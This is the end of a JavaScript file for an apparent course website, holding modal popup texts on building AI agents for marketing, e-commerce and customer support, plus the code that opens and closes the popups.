                    <div class="modal-section">
                        <h4>Example</h4>
                        <p>"You are a friendly barista at a coffee shop, helping customers choose drinks. Use casual language and coffee terminology."</p>
                    </div>
                `
            },
            'tip-constraints': {
                title: 'Setting Constraints',
                body: `
                    <p>Define what the agent should and should not do.</p>
                    <div class="modal-section">
                        <h4>Examples</h4>
                        <ul>
                            <li>"Never discuss competitor products"</li>
                            <li>"Don't make up information — say you don't know"</li>
                            <li>"Keep responses under 3 sentences"</li>
                            <li>"Always include a call to action"</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Enforcement</h4>
                        <p>Constraints guide but don't guarantee behavior. Test edge cases and add validation where critical.</p>
                    </div>
                `
            },
            'tip-context': {
                title: 'Providing Context',
                body: `
                    <p>Give the agent information it needs to be helpful.</p>
                    <div class="modal-section">
                        <h4>Dynamic Context</h4>
                        <ul>
                            <li>Current date and time</li>
                            <li>User's name and preferences</li>
                            <li>Recent orders or activity</li>
                            <li>Relevant product catalog</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Static Context</h4>
                        <ul>
                            <li>Company policies</li>
                            <li>FAQ content</li>
                            <li>Brand voice guidelines</li>
                        </ul>
                    </div>
                `
            },

            // Marketing Capabilities
            'marketing-content': {
                title: 'Content Generation',
                body: `
                    <p>Create marketing content at scale while maintaining quality.</p>
                    <div class="modal-section">
                        <h4>Content Types</h4>
                        <ul>
                            <li>Blog posts and articles</li>
                            <li>Product descriptions</li>
                            <li>Landing page copy</li>
                            <li>Ad variations</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Quality Tips</h4>
                        <p>Provide brand guidelines, tone examples, and target audience info in the system prompt.</p>
                    </div>
                `
            },
            'marketing-seo': {
                title: 'SEO Optimization',
                body: `
                    <p>Use AI to research keywords and optimize content structure.</p>
                    <div class="modal-section">
                        <h4>Capabilities</h4>
                        <ul>
                            <li>Keyword research and clustering</li>
                            <li>Meta title/description generation</li>
                            <li>Content structure recommendations</li>
                            <li>Internal linking suggestions</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Integration</h4>
                        <p>Combine with SEO tools (Ahrefs, SEMrush) APIs for data-driven recommendations.</p>
                    </div>
                `
            },
            'marketing-email': {
                title: 'Email Campaigns',
                body: `
                    <p>Generate personalized email sequences and A/B test variants.</p>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <ul>
                            <li>Onboarding sequences</li>
                            <li>Abandoned cart recovery</li>
                            <li>Newsletter content</li>
                            <li>Re-engagement campaigns</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Personalization</h4>
                        <p>Pass user data to generate truly personalized content, not just mail merge fields.</p>
                    </div>
                `
            },
            'marketing-social': {
                title: 'Social Media Management',
                body: `
                    <p>Generate platform-specific content and manage engagement.</p>
                    <div class="modal-section">
                        <h4>Content Types</h4>
                        <ul>
                            <li>Twitter/X threads</li>
                            <li>LinkedIn posts</li>
                            <li>Instagram captions</li>
                            <li>Reply suggestions</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Platform Adaptation</h4>
                        <p>Same message, different format for each platform. Agents can handle this automatically.</p>
                    </div>
                `
            },
            'marketing-analysis': {
                title: 'Feedback Analysis',
                body: `
                    <p>Extract insights from customer feedback at scale.</p>
                    <div class="modal-section">
                        <h4>Analysis Types</h4>
                        <ul>
                            <li>Sentiment classification</li>
                            <li>Feature request extraction</li>
                            <li>Complaint categorization</li>
                            <li>Trend identification</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Sources</h4>
                        <p>Reviews, support tickets, social mentions, survey responses — all can be analyzed.</p>
                    </div>
                `
            },
            'marketing-competitor': {
                title: 'Competitor Research',
                body: `
                    <p>Analyze competitor positioning and find opportunities.</p>
                    <div class="modal-section">
                        <h4>Analysis</h4>
                        <ul>
                            <li>Feature comparison</li>
                            <li>Pricing analysis</li>
                            <li>Messaging/positioning gaps</li>
                            <li>Review sentiment comparison</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Automation</h4>
                        <p>Combine with web scraping tools to keep competitive intelligence updated.</p>
                    </div>
                `
            },

            // Marketing Code
            'code-social-agent': {
                title: 'Social Media Agent Code',
                body: `
                    <p>Tools for generating and scheduling social content.</p>
                    <div class="modal-section">
                        <h4>Key Design Points</h4>
                        <ul>
                            <li>Platform-aware generation</li>
                            <li>Tone/voice customization</li>
                            <li>Hashtag optimization</li>
                            <li>Scheduling integration</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Integration</h4>
                        <p>Connect to Buffer, Hootsuite, or native platform APIs for actual posting.</p>
                    </div>
                `
            },
            'code-seo-agent': {
                title: 'SEO Agent Code',
                body: `
                    <p>Combine LLM intelligence with SEO data tools.</p>
                    <div class="modal-section">
                        <h4>Workflow</h4>
                        <ol>
                            <li>Research keywords for topic</li>
                            <li>Analyze top-ranking content</li>
                            <li>Generate optimized content</li>
                            <li>Create meta tags</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <h4>Data Sources</h4>
                        <p>Integrate with Ahrefs, SEMrush, or Google Search Console APIs for real data.</p>
                    </div>
                `
            },
            'code-email-agent': {
                title: 'Email Campaign Agent',
                body: `
                    <p>Generate complete email sequences with personalization.</p>
                    <div class="modal-section">
                        <h4>Sequence Design</h4>
                        <ul>
                            <li>Goal-oriented structure</li>
                            <li>Optimal timing between emails</li>
                            <li>Progressive value delivery</li>
                            <li>Clear CTAs per email</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>A/B Testing</h4>
                        <p>Generate multiple subject line variants automatically for testing.</p>
                    </div>
                `
            },
            'code-feedback-agent': {
                title: 'Feedback Analysis Agent',
                body: `
                    <p>Extract structured insights from unstructured feedback.</p>
                    <div class="modal-section">
                        <h4>Output Structure</h4>
                        <ul>
                            <li>Overall sentiment score</li>
                            <li>Key themes and topics</li>
                            <li>Specific feature mentions</li>
                            <li>Actionable recommendations</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Scale</h4>
                        <p>Process thousands of reviews to find patterns humans would miss.</p>
                    </div>
                `
            },

            // E-commerce Use Cases
            'usecase-descriptions': {
                title: 'Product Descriptions',
                body: `
                    <p>Generate compelling, SEO-friendly product descriptions at scale.</p>
                    <div class="modal-section">
                        <h4>Workflow</h4>
                        <ol>
                            <li>Input: Product specs, images, category</li>
                            <li>Generate: Multiple description variants</li>
                            <li>Optimize: Include keywords naturally</li>
                            <li>Output: Ready for catalog</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <h4>ROI</h4>
                        <p>Turn 1000 basic product listings into compelling descriptions in hours instead of weeks.</p>
                    </div>
                `
            },
            'usecase-support': {
                title: 'Customer Support Bot',
                body: `
                    <p>24/7 intelligent support that handles most queries automatically.</p>
                    <div class="modal-section">
                        <h4>Capabilities</h4>
                        <ul>
                            <li>Order status and tracking</li>
                            <li>Return/refund processing</li>
                            <li>Product questions</li>
                            <li>Account issues</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Human Handoff</h4>
                        <p>Seamlessly escalate complex issues to human agents with full context.</p>
                    </div>
                `
            },
            'usecase-recommendations': {
                title: 'Personalized Recommendations',
                body: `
                    <p>Go beyond "customers also bought" with intelligent recommendations.</p>
                    <div class="modal-section">
                        <h4>Inputs</h4>
                        <ul>
                            <li>Purchase history</li>
                            <li>Browsing behavior</li>
                            <li>Stated preferences</li>
                            <li>Current context (cart, season)</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Output</h4>
                        <p>Recommendations with natural language explanations of why each product fits.</p>
                    </div>
                `
            },
            'usecase-search': {
                title: 'Natural Language Search',
                body: `
                    <p>Let users search the way they naturally describe what they want.</p>
                    <div class="modal-section">
                        <h4>Examples</h4>
                        <ul>
                            <li>"Something warm for hiking in fall"</li>
                            <li>"Gift for tech-savvy teenager"</li>
                            <li>"Like my last purchase but bigger"</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Implementation</h4>
                        <p>LLM translates natural language to structured filters, then searches your catalog.</p>
                    </div>
                `
            },
            'usecase-reviews': {
                title: 'Review Insights',
                body: `
                    <p>Extract actionable insights from customer reviews.</p>
                    <div class="modal-section">
                        <h4>Analysis</h4>
                        <ul>
                            <li>Common complaints by product</li>
                            <li>Feature requests</li>
                            <li>Quality issues to address</li>
                            <li>Positive highlights for marketing</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Automation</h4>
                        <p>Daily/weekly digest of review insights, automatically categorized and prioritized.</p>
                    </div>
                `
            },
            'usecase-moderation': {
                title: 'Content Moderation',
                body: `
                    <p>Automatically flag inappropriate or fake content.</p>
                    <div class="modal-section">
                        <h4>Detection</h4>
                        <ul>
                            <li>Spam reviews</li>
                            <li>Inappropriate content</li>
                            <li>Competitor attacks</li>
                            <li>Incentivized reviews</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Workflow</h4>
                        <p>Auto-flag for human review, or auto-hide based on confidence thresholds.</p>
                    </div>
                `
            },

            // Support Bot Code
            'code-support-bot': {
                title: 'Support Bot Implementation',
                body: `
                    <p>A complete customer support agent with tools and escalation.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li>Order lookup via tools</li>
                            <li>Return initiation workflow</li>
                            <li>Escalation rules in prompt</li>
                            <li>Empathetic communication</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Data Access</h4>
                        <p>Tools connect to your order system, not training data. Responses are always accurate.</p>
                    </div>
                `
            },
            'code-recommendations': {
                title: 'Recommendation Engine',
                body: `
                    <p>Context-aware product suggestions with explanations.</p>
                    <div class="modal-section">
                        <h4>Data Gathering</h4>
                        <ul>
                            <li>User profile and preferences</li>
                            <li>Recent purchase history</li>
                            <li>Current cart contents</li>
                            <li>Browsing session data</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Value Add</h4>
                        <p>Not just "similar items" — explains WHY each recommendation makes sense for this user.</p>
                    </div>
                `
            },
            'code-smart-search': {
                title: 'Smart Search Implementation',
                body: `
                    <p>Translate natural queries to structured search filters.</p>
                    <div class="modal-section">
                        <h4>Query Understanding</h4>
                        <ul>
                            <li>Extract intent and constraints</li>
                            <li>Map to product attributes</li>
                            <li>Handle ambiguity gracefully</li>
                            <li>Suggest clarifications if needed</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Hybrid Approach</h4>
                        <p>Combine semantic understanding with traditional search for best results.</p>
                    </div>
                `
            },

            // Best Practices
            'practice-transparency': {
                title: 'AI Transparency',
                body: `
                    <p>Users should know they're interacting with AI.</p>
                    <div class="modal-section">
                        <h4>Why It Matters</h4>
                        <ul>
                            <li>Builds trust</li>
                            <li>Sets appropriate expectations</li>
                            <li>May be legally required</li>
                            <li>Ethical responsibility</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>How To</h4>
                        <p>"Hi! I'm an AI assistant for TechStore. How can I help you today?"</p>
                    </div>
                `
            },
            'practice-limits': {
                title: 'Setting Boundaries',
                body: `
                    <p>Define clear limits on what the agent can and cannot do.</p>
                    <div class="modal-section">
                        <h4>Examples</h4>
                        <ul>
                            <li>No refunds over $X without human approval</li>
                            <li>Can't change shipping addresses</li>
                            <li>Won't discuss competitors</li>
                            <li>Escalates medical/legal questions</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Implementation</h4>
                        <p>Encode limits in system prompt AND in tool permissions. Defense in depth.</p>
                    </div>
                `
            },
            'practice-testing': {
                title: 'Testing AI Systems',
                body: `
                    <p>AI systems need specialized testing approaches.</p>
                    <div class="modal-section">
                        <h4>Test Types</h4>
                        <ul>
                            <li><strong>Happy Path</strong> — Normal use cases</li>
                            <li><strong>Edge Cases</strong> — Unusual inputs</li>
                            <li><strong>Adversarial</strong> — Prompt injection attempts</li>
                            <li><strong>Regression</strong> — Previous failures</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Evals</h4>
                        <p>Build automated evaluation suites that run against new prompts/models.</p>
                    </div>
                `
            },
            'practice-monitoring': {
                title: 'Monitoring & Iteration',
                body: `
                    <p>Continuously improve based on real usage data.</p>
                    <div class="modal-section">
                        <h4>Metrics</h4>
                        <ul>
                            <li>Resolution rate</li>
                            <li>User satisfaction scores</li>
                            <li>Escalation frequency</li>
                            <li>Conversation length</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Logging</h4>
                        <p>Log conversations (with consent) to identify failure patterns and improvement opportunities.</p>
                    </div>
                `
            },
            'practice-fallback': {
                title: 'Human Fallback',
                body: `
                    <p>Always provide a path to human support.</p>
                    <div class="modal-section">
                        <h4>Triggers</h4>
                        <ul>
                            <li>User explicitly requests human</li>
                            <li>Agent confidence is low</li>
                            <li>Sensitive topics</li>
                            <li>Multiple failed attempts</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Handoff</h4>
                        <p>Transfer full conversation context to human agent for seamless continuation.</p>
                    </div>
                `
            },
            'practice-privacy': {
                title: 'Privacy & Security',
                body: `
                    <p>Handle user data responsibly in AI systems.</p>
                    <div class="modal-section">
                        <h4>Guidelines</h4>
                        <ul>
                            <li>Don't log PII in conversation logs</li>
                            <li>Mask sensitive data in tool calls</li>
                            <li>Comply with GDPR/CCPA</li>
                            <li>Use data processing agreements</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>API Providers</h4>
                        <p>Review data retention policies. Claude and GPT-4 have options for zero data retention.</p>
                    </div>
                `
            }
        };
    }

    init() {
        if (!this.modal) return;

        document.querySelectorAll('.arch-layer.clickable').forEach(layer => {
            layer.addEventListener('click', (e) => {
                e.stopPropagation();
                const modalId = layer.dataset.modal;
                this.open(modalId);
            });
        });

        document.querySelectorAll('.ajax-code-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                const modalId = btn.dataset.modal;
                this.open(modalId);
            });
        });

        document.querySelectorAll('.render-step.clickable').forEach(step => {
            step.addEventListener('click', (e) => {
                e.stopPropagation();
                const modalId = step.dataset.modal;
                this.open(modalId);
            });
        });

        document.querySelectorAll('.render-mode.clickable').forEach(mode => {
            mode.addEventListener('click', (e) => {
                e.stopPropagation();
                const modalId = mode.dataset.modal;
                this.open(modalId);
            });
        });

        document.querySelectorAll('.feature-item.clickable').forEach(item => {
            item.addEventListener('click', (e) => {
                e.stopPropagation();
                const modalId = item.dataset.modal;
                this.open(modalId);
            });
        });

        // Generic clickable elements with data-modal
        document.querySelectorAll('[data-modal].clickable').forEach(el => {
            if (!el.classList.contains('arch-layer') &&
                !el.classList.contains('render-step') &&
                !el.classList.contains('ajax-code-btn') &&
                !el.classList.contains('render-mode') &&
                !el.classList.contains('feature-item')) {
                el.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const modalId = el.dataset.modal;
                    this.open(modalId);
                });
            }
        });

        // Event delegation for any element with data-modal attribute
        document.addEventListener('click', (e) => {
            const target = e.target.closest('[data-modal]');
            if (target) {
                e.stopPropagation();
                const modalId = target.dataset.modal;
                if (modalId) this.open(modalId);
            }
        });

        this.modal.querySelector('.arch-modal-close')?.addEventListener('click', () => this.close());
        this.modal.addEventListener('click', (e) => {
            if (e.target === this.modal) this.close();
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && this.modal.classList.contains('active')) {
                this.close();
            }
        });
    }

    open(id) {
        const content = this.content[id];
        if (!content) return;

        this.titleEl.textContent = content.title;
        this.bodyEl.innerHTML = content.body;

        // Use wide modal for code comparisons
        if (id === 'ajax-code') {
            this.modal.classList.add('wide');
        } else {
            this.modal.classList.remove('wide');
        }

        this.modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    close() {
        this.modal.classList.remove('active', 'wide');
        document.body.style.overflow = '';
    }
}

// Initialize everything when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    new Preloader();

    // Delay main initialization until after preloader
    setTimeout(() => {
        new LectureManager();
        new ThemeToggle();
    }, 500);
});

// Handle visibility change (pause/resume animations)
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        document.querySelectorAll('.scan-line').forEach(el => {
            el.style.animationPlayState = 'paused';
        });
    } else {
        document.querySelectorAll('.scan-line').forEach(el => {
            el.style.animationPlayState = 'running';
        });
    }
});
